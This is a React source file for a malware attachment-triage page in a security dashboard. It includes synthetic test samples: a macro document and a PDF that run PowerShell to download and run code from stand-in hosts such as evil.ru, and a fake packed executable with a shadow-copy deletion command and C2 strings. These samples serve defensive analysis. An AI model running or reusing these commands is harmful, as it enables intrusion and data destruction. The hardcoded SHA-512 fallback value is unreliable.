import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { PageShell } from "@/components/PageShell";
import { SectionBar, Panel, SendToRow, Chip, WorkflowActions } from "@/components/soc";
import { StatusBar, KeyFields, EvidenceCard, Empty, RiskScore, TwoColumnOutput, MetricGrid, CollapsibleSection } from "@/components/output";
import { useLocker } from "@/lib/locker";
import { pushTimelineEvent } from "@/lib/timeline";
import { CopyInline } from "@/components/CopyButton";
import { copyText } from "@/lib/copy";
import { MailWarning as FileWarning, Hash, Database, ArrowRight, ShieldAlert, ExternalLink, Upload, Eraser, Download, Sigma, Binary, TriangleAlert as AlertTriangle, Activity, Copy, Check, X, FileCode, Wrench } from "lucide-react";
import { toast } from "sonner";
import { uploadMalwareFile } from "@/api/backend";
import { ErrorBoundary } from "@/components/ErrorBoundary";
import { PeSectionMap } from "@/components/malware/PeSectionMap";
import { YaraRuleModal } from "@/components/malware/YaraRuleModal";
import { DocumentInspectorView } from "@/components/malware/DocumentInspectorView";
import { HexViewerModal } from "@/components/malware/HexViewerModal";
import { type PeAnalysis } from "@/lib/malware/pe-models";
import { type OfficeAnalysis, type PdfAnalysis, type ScriptAnalysis } from "@/lib/malware/document-dissector";
import { analyzeFileArtifact } from "@/lib/fileArtifact";

export const Route = createFileRoute("/attachment")({ component: AttachmentPage });

const ATTACHMENT_SAMPLES = [
  {
    name: "Q3_Executive_Bonus.docm",
    label: "Weaponized Macro DOCM",
    mime: "application/vnd.ms-word.document.macroEnabled.12",
    content: "PK\x03\x04\x14\x00\x06\x00\x08\x00[Content_Types].xml\nword/_rels/settings.xml.rels Target='http://c2-staging.org/template.dotm' TargetMode='External'\nvbaProject.bin Sub AutoOpen()\nDim cmd As String\ncmd = 'powershell -enc SUVYIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGgAbwBzAHQALgByAHUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=='\nCall Shell(cmd, 0)\nEnd Sub\nWScript.Shell CreateObject URLDownloadToFile",
  },
  {
    name: "urgent_overdue_notice.pdf",
    label: "Malicious PDF Invoice",
    mime: "application/pdf",
    content: "%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n3 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('Please authenticate'); app.launchURL('https://secure-login-portal.ru/verify', true);) >>\nendobj\n4 0 obj\n<< /Type /Action /S /Launch /F (powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil.ru/p')) >>\nendobj\n/EmbeddedFiles << /Names [ (payload.exe) 5 0 R ] >>\n/URI (https://secure-login-portal.ru/verify)\n%%EOF",
  },
  {
    name: "invoice_2024_05_15.pdf.exe",
    label: "Packed Ransomware Executable",
    mime: "application/x-dosexec",
    content: "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00" + "\x00".repeat(36) + "\x40\x00\x00\x00"
      + "PE\x00\x00\x4c\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x01"
      + "\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
      + ".text\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x60"
      + "UPX1\x00\x00\x00\x00\x00\x50\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\xe0"
      + "VirtualAlloc\x00CreateRemoteThread\x00WriteProcessMemory\x00vssadmin delete shadows /all /quiet\nhttps://evil-c2-beacon.ru/drop\n185.220.101.5\nransom@dark-onion.org",
  },
];

interface ApiResult {
  metadata: { filename: string; size_bytes: number; analyzed_at: string; safety_note: string };
  file_type: { filename: string; extension: string | null; magic_type: string };
  hashes: { md5: string; sha1: string; sha256: string; sha512: string };
  entropy: number;
  strings_preview: string[];
  suspicious_strings: { keyword: string; severity: string; detail: string }[];
  summary: { score: number; rating: string; total_findings: number; confidence: string; note?: string };
  findings: { severity: string; title: string; detail: string; recommendation: string }[];
  pe?: PeAnalysis;
  document?: OfficeAnalysis;
  pdf?: PdfAnalysis;
  script?: ScriptAnalysis;
  yara_rule?: string;
}

function genJsonExport(result: ApiResult): string {
  return JSON.stringify({
    version: "1.0",
    ts: new Date().toISOString(),
    filename: result.metadata.filename,
    file_type: result.file_type,
    hashes: result.hashes,
    entropy: result.entropy,
    suspicious_strings: result.suspicious_strings,
    findings: result.findings,
    summary: result.summary,
  }, null, 2);
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function mapClientAnalysisToApiResult(fileName: string, fileSize: number, content: string, clientRes: any): ApiResult {
  return {
    metadata: {
      filename: fileName,
      size_bytes: fileSize,
      analyzed_at: new Date().toISOString(),
      safety_note: "Analyzed locally in browser engine. Files are never executed.",
    },
    file_type: {
      filename: fileName,
      extension: clientRes.extension || null,
      magic_type: clientRes.mimeGuess || "application/octet-stream",
    },
    hashes: {
      md5: clientRes.hashes.md5,
      sha1: clientRes.hashes.sha1,
      sha256: clientRes.hashes.sha256,
      sha512: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    },
    entropy: clientRes.highEntropy ? 7.8 : 4.6,
    strings_preview: clientRes.strings?.samples ? clientRes.strings.samples.map((sm: any) => sm.value) : content.split("\n").slice(0, 30),
    suspicious_strings: (clientRes.evidenceItems || []).map((e: any) => ({
      keyword: e.label,
      severity: e.severity === "high" || e.severity === "critical" ? "high" : "medium",
      detail: e.value,
    })),
    summary: {
      score: clientRes.summary.score,
      rating: clientRes.summary.verdict === "critical" ? "Known Malicious" : clientRes.summary.verdict === "high" ? "High Risk" : clientRes.summary.verdict === "medium" ? "Suspicious" : "Clean",
      total_findings: clientRes.findings.length,
      confidence: "high",
    },
    findings: (clientRes.findings || []).map((f: any) => ({
      severity: f.severity,
      title: f.title,
      detail: f.reason,
      recommendation: f.action,
    })),
    pe: clientRes.peAnalysis,
    document: clientRes.officeAnalysis,
    pdf: clientRes.pdfAnalysis,
    script: clientRes.scriptAnalysis,
    yara_rule: clientRes.synthesizedYara,
  };
}

function AttachmentPage() {
  const navigate = useNavigate();
  useEffect(() => {
    navigate({ to: "/file", replace: true });
  }, [navigate]);
  const fileRef = useRef<HTMLInputElement>(null);
  const [file, setFile] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<ApiResult | null>(null);
  const [zoomedHash, setZoomedHash] = useState<{ algo: string; value: string; bits: number } | null>(null);
  const [hashCopied, setHashCopied] = useState("");
  const [hashInput, setHashInput] = useState("");
  const [yaraModalOpen, setYaraModalOpen] = useState(false);
  const [hexModalOpen, setHexModalOpen] = useState(false);
  const locker = useLocker();

  useEffect(() => {
    function handleKey(e: KeyboardEvent) {
      if (e.key === "Escape") setZoomedHash(null);
    }
    window.addEventListener("keydown", handleKey);
    return () => window.removeEventListener("keydown", handleKey);
  }, []);

  async function handleUpload() {
    if (!file) return;
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const res = await uploadMalwareFile(file);
      setResult(res as unknown as ApiResult);
      pushTimelineEvent({ source: "attachment", verb: "analyzed", detail: `Analysed ${file.name}`, result: `Score: ${(res as any).summary?.score ?? "?"} — ${(res as any).summary?.total_findings ?? "?"} findings` });
    } catch {
      try {
        const text = await file.text();
        const clientRes = await analyzeFileArtifact({ fileName: file.name, content: text, committed: true });
        if (clientRes) {
          const mapped = mapClientAnalysisToApiResult(file.name, file.size, text, clientRes);
          setResult(mapped);
          pushTimelineEvent({ source: "attachment", verb: "analyzed", detail: `Analysed ${file.name}`, result: `Score: ${clientRes.summary.score} — ${clientRes.findings.length} findings` });
        }
      } catch (err2: any) {
        setError(err2?.message || "analysis failed");
        toast.error(err2?.message || "Upload failed");
      }
    } finally {
      setLoading(false);
    }
  }

  async function loadSampleAttachment(s: typeof ATTACHMENT_SAMPLES[0]) {
    const syntheticFile = new File([s.content], s.name, { type: s.mime });
    setFile(syntheticFile);
    setResult(null);
    setError(null);
    setLoading(true);
    try {
      const res = await uploadMalwareFile(syntheticFile);
      setResult(res as unknown as ApiResult);
      pushTimelineEvent({
        source: "attachment",
        verb: "analyzed",
        detail: `Analysed sample ${s.name}`,
        result: `Score: ${(res as any).summary?.score ?? "?"} — ${(res as any).summary?.total_findings ?? "?"} findings`,
      });
      toast.success(`Loaded and analyzed sample: ${s.name}`);
    } catch {
      try {
        const clientRes = await analyzeFileArtifact({ fileName: s.name, content: s.content, committed: true });
        if (clientRes) {
          const mapped = mapClientAnalysisToApiResult(s.name, s.content.length, s.content, clientRes);
          setResult(mapped);
          pushTimelineEvent({
            source: "attachment",
            verb: "analyzed",
            detail: `Analysed sample ${s.name}`,
            result: `Score: ${clientRes.summary.score} — ${clientRes.findings.length} findings`,
          });
          toast.success(`Loaded sample: ${s.name}`);
        }
      } catch (err2: any) {
        setError(err2?.message || "analysis failed");
        toast.error(err2?.message || "Sample load failed");
      }
    } finally {
      setLoading(false);
    }
  }

  function handleClear() {
    setFile(null);
    setResult(null);
    setError(null);
    if (fileRef.current) fileRef.current.value = "";
  }

  return (
    <ErrorBoundary name="AttachmentPage">
    <PageShell
      eyebrow="triage / attachment"
      title="Attachment Triage"
      description="Static review of file metadata, hashes, strings, and signals. Files are never executed."
      crumbs={[{ label: "Triage" }, { label: "Attachment" }]}
    >
      <SectionBar id="IN" label="Intake · file upload" meta={file ? file.name : "no file selected"} />

      <Panel title={file ? "File selected" : "Upload a file"} icon={FileWarning}>
        <div className="flex flex-wrap items-center gap-3">
          <input ref={fileRef} type="file" className="hidden" onChange={(e) => { setFile(e.target.files?.[0] || null); setResult(null); setError(null); }} />
          <button
            onClick={() => fileRef.current?.click()}
            className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-2 px-3 py-2 text-mono ba-text-sm text-fg-dim transition-colors duration-150 hover:border-primary/40 hover:text-foreground"
          >
            <Upload className="h-3.5 w-3.5" /> Choose file
          </button>
          {file && (
            <>
              <span className="text-mono ba-text-sm text-foreground">{file.name} ({formatSize(file.size)})</span>
              <button onClick={handleUpload} disabled={loading} className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-2.5 py-1.5 text-mono ba-text-2xs text-primary transition-colors duration-150 hover:bg-primary/20 disabled:opacity-50">
                {loading ? "Analysing..." : "Analyse"}
              </button>
              <button onClick={handleClear} className="inline-flex items-center gap-1 rounded border border-border bg-surface-2 px-2 py-1.5 text-mono ba-text-2xs text-muted-foreground transition-colors duration-150 hover:border-destructive/40 hover:text-destructive">
                <Eraser className="h-3 w-3" /> clear
              </button>
            </>
          )}
        </div>
        {!file && <p className="mt-2 text-mono ba-text-2xs text-muted-foreground">Supports any file type. Max 15 MB.</p>}

        <div className="mt-3 pt-3 border-t border-border/50">
          <span className="text-mono ba-text-3xs text-muted-foreground uppercase tracking-wider block mb-1.5 font-semibold">
            Analyst Presets (1-Click Triage):
          </span>
          <div className="flex flex-wrap gap-1.5">
            {ATTACHMENT_SAMPLES.map((s) => (
              <button
                key={s.name}
                type="button"
                onClick={() => loadSampleAttachment(s)}
                className="inline-flex items-center gap-1.5 rounded border border-border/80 bg-surface-1 px-2.5 py-1 text-mono ba-text-2xs text-foreground hover:border-primary/50 hover:bg-primary/10 transition-colors"
              >
                <FileWarning className="h-3 w-3 text-warning" />
                <span>{s.label}</span>
                <span className="text-mono ba-text-3xs text-muted-foreground">({s.name})</span>
              </button>
            ))}
          </div>
        </div>
      </Panel>

      {/* Hash lookup — reputation lives on /intel behind the consent gate */}
      <Panel title="Hash Reputation Lookup" icon={Hash}>
        <div className="flex flex-wrap items-center gap-2">
          <input
            value={hashInput}
            onChange={(e) => setHashInput(e.target.value)}
            aria-label="Hash to look up"
            placeholder="Paste a SHA-256, MD5, or SHA-1 hash…"
            className="min-w-0 flex-1 rounded border border-border bg-surface-0 px-2.5 py-1.5 text-mono ba-text-sm text-foreground outline-none placeholder:text-muted-foreground focus:border-primary/50"
          />
          {result && (
            <button
              onClick={() => setHashInput(result.hashes.sha256)}
              className="inline-flex items-center gap-1 rounded border border-border bg-surface-2 px-2 py-1.5 text-mono ba-text-2xs text-fg-dim transition-colors duration-150 hover:border-primary/40 hover:text-foreground"
            >
              Use analyzed file&apos;s SHA-256
            </button>
          )}
          {hashInput.trim() ? (
            <>
              <button
                onClick={() => navigate({ to: "/intel", search: { q: hashInput.trim() } })}
                className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2 py-1.5 text-mono ba-text-2xs text-primary hover:bg-primary/20"
              >
                <ExternalLink className="h-3 w-3" /> Look up on Intel
              </button>
              <button
                onClick={() => { copyText(hashInput); setHashCopied("hash"); setTimeout(() => setHashCopied(""), 1200); }}
                className="inline-flex items-center gap-1 rounded border border-border bg-surface-2 px-2 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-foreground"
              >
                {hashCopied === "hash" ? <><Check className="h-3 w-3" /> copied</> : "Copy"}
              </button>
            </>
          ) : null}
        </div>
        <p className="mt-2 text-mono ba-text-2xs text-muted-foreground">
          Reputation checks run on the Intel page and only fire after you opt in per query — nothing is sent from here.
        </p>
      </Panel>

      <StatusBar stats={[
        { label: "Status", value: loading ? "Analyzing..." : error ? "Error" : result ? "Complete" : "Idle", tone: error ? "destructive" : loading ? "warning" : result ? "success" : "muted" },
        { label: "Detonation", value: "never", tone: "primary" },
        { label: "Upload", value: file ? "local only" : "none", tone: "muted" },
        { label: "Mode", value: "static review" },
      ]} />

      {!result && !loading && !error && !file && (
        <Empty icon={FileWarning} title="No file loaded" hint="File Triage computes hashes (MD5/SHA1/SHA256), extracts embedded strings and URLs, detects suspicious patterns, and can detonate in a sandbox. Select a file above and click Analyze." />
      )}

      {loading && (
        <Panel title="Analysis in progress" icon={Sigma}>
          <p className="text-mono ba-text-sm text-muted-foreground">Computing hashes, extracting strings, scanning for suspicious patterns...</p>
        </Panel>
      )}

      {error && (
        <Panel title="Error" icon={AlertTriangle}>
          <p className="text-mono ba-text-sm text-destructive">{error}</p>
        </Panel>
      )}

      {result && !loading && (
        <div className="space-y-5">
          <SectionBar id="OT" label="Output · signals & findings" meta={`${result.summary.total_findings} findings · ${result.suspicious_strings.length} suspicious strings`} />

          {/* Metrics */}
          <MetricGrid
            columns={4}
            metrics={[
              { label: "Score", value: `${result.summary.score}/100`, tone: result.summary.score < 40 ? "success" : result.summary.score < 70 ? "warning" : "destructive", icon: Activity },
              { label: "Rating", value: result.summary.rating, tone: result.summary.rating === "High Risk" || result.summary.rating === "Known Malicious" ? "destructive" : result.summary.rating === "Suspicious" ? "warning" : "success" },
              { label: "Findings", value: result.summary.total_findings, tone: result.summary.total_findings > 0 ? "warning" : "default" },
              { label: "Entropy", value: result.entropy.toFixed(1), tone: result.entropy >= 7.2 ? "warning" : "default", icon: Binary },
              { label: "Size", value: formatSize(result.metadata.size_bytes) },
              { label: "Strings", value: result.strings_preview.length },
              { label: "Suspicious", value: result.suspicious_strings.length, tone: result.suspicious_strings.length > 0 ? "warning" : "default" },
              { label: "Detonation", value: "never", tone: "success" },
            ]}
          />

          <RiskScore
            score={result.summary.score}
            label="Risk Score"
            confidence={result.summary.confidence}
            tone={result.summary.score < 40 ? "success" : result.summary.score < 70 ? "warning" : "destructive"}
          />

          {/* Quick Forensic Action Bar */}
          <div className="flex flex-wrap items-center justify-between gap-2 rounded-lg border border-border bg-surface-1/60 p-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="text-mono ba-text-3xs text-muted-foreground uppercase font-semibold">
                Forensics:
              </span>
              <button
                type="button"
                onClick={() => setYaraModalOpen(true)}
                className="inline-flex items-center gap-1.5 rounded border border-warning/50 bg-warning/10 px-2.5 py-1 text-mono ba-text-2xs text-warning hover:bg-warning/20 font-semibold transition-colors"
              >
                <FileCode className="h-3 w-3" /> YARA Rule
              </button>
              <button
                type="button"
                onClick={() => setHexModalOpen(true)}
                className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-2 px-2.5 py-1 text-mono ba-text-2xs text-foreground hover:bg-surface-3 transition-colors"
              >
                <Binary className="h-3 w-3" /> Hex Inspector
              </button>
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <button
                type="button"
                onClick={() => {
                  sessionStorage.setItem("cyberchef_input", result.strings_preview.join("\n"));
                  toast.success("Payload sent to CyberChef");
                  navigate({ to: "/chef" });
                }}
                className="inline-flex items-center gap-1.5 rounded border border-primary/40 bg-primary/10 px-2.5 py-1 text-mono ba-text-2xs text-primary hover:bg-primary/20 transition-colors"
              >
                <Wrench className="h-3 w-3" /> To CyberChef
              </button>
              <button
                type="button"
                onClick={() => {
                  navigate({ to: "/file" });
                }}
                className="inline-flex items-center gap-1 rounded border border-border bg-surface-2 px-2.5 py-1 text-mono ba-text-2xs text-foreground hover:border-primary/40 transition-colors"
              >
                Deep File Workbench <ArrowRight className="h-3 w-3" />
              </button>
            </div>
          </div>

          {/* Cryptographic Identity */}
          <Panel title="Cryptographic Identity" icon={Hash} meta="4 algorithms" actions={
            <div className="flex items-center gap-1">
              <button onClick={() => { [result.hashes.md5, result.hashes.sha1, result.hashes.sha256, result.hashes.sha512].forEach((h) => locker.add({ value: h, type: h.length === 32 ? "md5" : h.length === 40 ? "sha1" : h.length === 64 ? "sha256" : "unknown", source: "/attachment" })); toast("Added all hashes to locker"); }} className="inline-flex items-center gap-1 rounded border border-subtle bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:bg-card/70 hover:text-foreground">+ all to locker</button>
            </div>
          }>
            <div className="grid gap-2 grid-cols-4">
              {([
                { algo: "MD5", value: result.hashes.md5, bits: 128, tone: "default" as const },
                { algo: "SHA-1", value: result.hashes.sha1, bits: 160, tone: "warning" as const },
                { algo: "SHA-256", value: result.hashes.sha256, bits: 256, tone: "success" as const },
                { algo: "SHA-512", value: result.hashes.sha512, bits: 512, tone: "primary" as const },
              ]).map((h) => (
                <div
                  key={h.algo}
                  className="group relative rounded-md border border-divider-strong bg-surface-2 p-2.5 transition-colors duration-150 hover:border-primary/40 hover:bg-card/80"
                >
                  <div className="flex items-center justify-between">
                    <span className="text-mono ba-text-2xs text-muted-foreground">{h.algo}</span>
                    <Chip tone={h.tone}>{h.bits}-bit</Chip>
                  </div>
                  <code className="mt-1.5 block break-all text-mono ba-text-2xs leading-snug text-foreground">{h.value}</code>
                  <div className="mt-1.5 flex items-center gap-1 opacity-0 transition-opacity group-hover:opacity-100">
                    <CopyInline value={h.value} />
                    <button onClick={() => { locker.add({ value: h.value, type: h.algo.toLowerCase() as any, source: "/attachment" }); toast(`Added ${h.algo} to locker`); }} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-px text-mono ba-text-3xs text-fg-dim hover:text-primary">locker</button>
                    <button onClick={() => setZoomedHash({ algo: h.algo, value: h.value, bits: h.bits })} className="rounded border border-divider-soft bg-surface-1 px-1.5 py-px text-mono ba-text-3xs text-fg-dim hover:text-primary">zoom</button>
                  </div>
                </div>
              ))}
            </div>
          </Panel>

          {/* Zoomed hash detail */}
          {zoomedHash && (
            <Panel
              title={`Detail · ${zoomedHash.algo}`}
              icon={Hash}
              meta={`${zoomedHash.bits}-bit`}
              actions={
                <button onClick={() => setZoomedHash(null)}
                  className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-mono ba-text-2xs text-primary hover:bg-primary/20">
                  close <X className="ml-1 inline h-3 w-3" />
                </button>
              }
            >
              <div className="space-y-3">
                <div>
                  <div className="text-mono ba-text-2xs text-muted-foreground">Full hash</div>
                  <code className="mt-1 block break-all rounded border border-subtle bg-surface-1 p-3 text-mono ba-text-xs leading-relaxed text-foreground select-all">{zoomedHash.value}</code>
                </div>
                <div className="flex flex-wrap gap-2">
                  <button onClick={() => { try { copyText(zoomedHash.value); } catch {/* noop */} setHashCopied(zoomedHash.algo); setTimeout(() => setHashCopied(""), 2000); }}
                    className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-2 px-3 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-foreground">
                    {hashCopied === zoomedHash.algo ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                    {hashCopied === zoomedHash.algo ? "copied" : "copy hash"}
                  </button>
                  <a href={`https://www.virustotal.com/gui/file/${zoomedHash.algo === "MD5" ? result.hashes.md5 : zoomedHash.algo === "SHA-1" ? result.hashes.sha1 : result.hashes.sha256}`} target="_blank" rel="noopener noreferrer"
                    className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-2 px-3 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-foreground">
                    <ExternalLink className="h-3.5 w-3.5" /> VirusTotal
                  </a>
                  <a href={`https://bazaar.abuse.ch/sample/${zoomedHash.algo === "MD5" ? result.hashes.md5 : zoomedHash.algo === "SHA-1" ? result.hashes.sha1 : result.hashes.sha256}/`} target="_blank" rel="noopener noreferrer"
                    className="inline-flex items-center gap-1.5 rounded border border-border bg-surface-2 px-3 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-foreground">
                    <ExternalLink className="h-3.5 w-3.5" /> MalwareBazaar
                  </a>
                </div>
              </div>
            </Panel>
          )}

          {/* File Identity + External References side-by-side */}
          <TwoColumnOutput
            ratio="2:1"
            left={
              <Panel title="File Identity" icon={FileWarning} meta={result.file_type.magic_type}>
                <KeyFields items={[
                  { label: "Name", value: result.metadata.filename },
                  { label: "Type", value: result.file_type.magic_type, tone: "primary" },
                  { label: "Size", value: formatSize(result.metadata.size_bytes) },
                  { label: "Extension", value: result.file_type.extension || "—" },
                  { label: "Detonation", value: "never", tone: "muted" },
                ]} />
              </Panel>
            }
            right={
              <Panel title="Reputation & Threat Lookups" meta="manual reputation">
                <div className="flex flex-col gap-2">
                  <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-primary" target="_blank" rel="noreferrer" href={`https://www.virustotal.com/gui/file/${result.hashes.sha256}`}><ExternalLink className="h-3 w-3" /> VirusTotal</a>
                  <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-primary" target="_blank" rel="noreferrer" href={`https://bazaar.abuse.ch/sample/${result.hashes.sha256}/`}><ExternalLink className="h-3 w-3" /> MalwareBazaar</a>
                  <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1.5 text-mono ba-text-2xs text-fg-dim hover:text-primary" target="_blank" rel="noreferrer" href={`https://hybrid-analysis.com/search?query=${result.hashes.sha256}`}><ExternalLink className="h-3 w-3" /> Hybrid Analysis</a>
                </div>
              </Panel>
            }
          />

          {/* PE Binary Header & Section Map */}
          {result.pe && result.pe.detected && (
            <Panel title="PE Binary Header & Section Entropy Map" icon={Binary}>
              <PeSectionMap pe={result.pe} fileName={result.metadata.filename} />
            </Panel>
          )}

          {/* Document, Macro & Script Forensics */}
          {(result.document?.detected || result.pdf?.detected || result.script?.detected) && (
            <Panel title="Document, Macro & Script Forensics" icon={FileWarning}>
              <DocumentInspectorView
                office={result.document}
                pdf={result.pdf}
                script={result.script}
                rawContent={result.strings_preview.join("\n")}
                fileName={result.metadata.filename}
              />
            </Panel>
          )}

          {/* Suspicious Strings - collapsible */}
          {result.suspicious_strings.length > 0 && (
            <CollapsibleSection id="SS" label="Suspicious Strings" meta={`${result.suspicious_strings.length} keyword(s)`} icon={Binary}>
              <ul className="space-y-1">
                {result.suspicious_strings.map((s) => (
                  <li key={s.keyword} className="flex items-center justify-between gap-2 border-b border-divider-soft py-1 text-mono ba-text-sm">
                    <code className="truncate text-foreground">{s.keyword}</code>
                    <Chip tone={s.severity === "high" ? "destructive" : "warning"}>{s.severity}</Chip>
                  </li>
                ))}
              </ul>
            </CollapsibleSection>
          )}

          {/* Strings Preview - collapsible */}
          {result.strings_preview.length > 0 && (
            <Panel title="Strings Preview" icon={Binary} meta={`${result.strings_preview.length} shown`} collapsible defaultCollapsed={result.strings_preview.length > 20}>
              <ul className="space-y-0.5">
                {result.strings_preview.map((s, i) => (
                  <li key={i} className="border-b border-divider-soft py-0.5 text-mono ba-text-2xs text-fg-dim">{s}</li>
                ))}
              </ul>
            </Panel>
          )}

          {/* Findings */}
          {result.findings.length > 0 && (
            <CollapsibleSection id="FN" label="Findings" meta={`${result.findings.length} total`} icon={AlertTriangle}>
              <div className="grid gap-3 grid-cols-2">
                {result.findings.map((f, i) => (
                  <EvidenceCard
                    key={i}
                    severity={f.severity === "high" ? "destructive" : f.severity === "medium" ? "warning" : "info"}
                    title={f.title}
                    reason={f.detail}
                    action={f.recommendation}
                    limitation="Static analysis indicator — requires analyst validation."
                  />
                ))}
              </div>
            </CollapsibleSection>
          )}

          {/* Export */}
          <Panel title="Export" icon={Download}>
            <WorkflowActions
              actions={[
                { kind: "export-md", onClick: () => {
                  const lines = [
                    `# Static Attachment Report`,
                    `**File:** \`${result.metadata.filename}\``,
                    `**Risk Score:** ${result.summary.score}/100`,
                    `**Rating:** ${result.summary.rating}`,
                    `**Generated:** ${new Date().toISOString()}`,
                    "", "## File Identity",
                    `- Type: ${result.file_type.magic_type}`,
                    `- Size: ${formatSize(result.metadata.size_bytes)}`,
                    `- Extension: ${result.file_type.extension || "—"}`,
                    `- Entropy: ${result.entropy}`,
                    "", "## Hashes",
                    `- MD5: ${result.hashes.md5}`,
                    `- SHA-1: ${result.hashes.sha1}`,
                    `- SHA-256: ${result.hashes.sha256}`,
                    `- SHA-512: ${result.hashes.sha512}`,
                  ];
                  if (result.suspicious_strings.length) {
                    lines.push("", "## Suspicious Strings", ...result.suspicious_strings.map((s) => `- [${s.severity.toUpperCase()}] ${s.keyword} — ${s.detail}`));
                  }
                  const md = lines.join("\n");
                  const blob = new Blob([md], { type: "text/markdown" });
                  const url = URL.createObjectURL(blob);
                  const a = document.createElement("a");
                  a.href = url; a.download = `attachment-report-${result.hashes.sha256.slice(0, 8)}.md`;
                  a.click(); URL.revokeObjectURL(url);
                } },
                { kind: "export-json", onClick: () => {
                  const json = genJsonExport(result);
                  const blob = new Blob([json], { type: "application/json" });
                  const url = URL.createObjectURL(blob);
                  const a = document.createElement("a");
                  a.href = url; a.download = `attachment-${result.hashes.sha256.slice(0, 8)}.json`;
                  a.click(); URL.revokeObjectURL(url);
                } },
              ]}
            />
          </Panel>

          <SendToRow targets={[
            { label: "Detection & MITRE", to: "/detection", icon: ShieldAlert },
            { label: "Logs & Alerts", to: "/logs", icon: Database },
            { label: "Case Notebook", to: "/case", icon: ArrowRight },
          ]} />
        </div>
      )}

      {result && (
        <>
          <YaraRuleModal
            isOpen={yaraModalOpen}
            onClose={() => setYaraModalOpen(false)}
            ruleContent={result.yara_rule || ""}
            fileName={result.metadata.filename}
            sampleText={result.strings_preview.join("\n")}
          />
          <HexViewerModal
            isOpen={hexModalOpen}
            onClose={() => setHexModalOpen(false)}
            rawContent={result.strings_preview.join("\n")}
            fileName={result.metadata.filename}
          />
        </>
      )}
    </PageShell>
    </ErrorBoundary>
  );
}
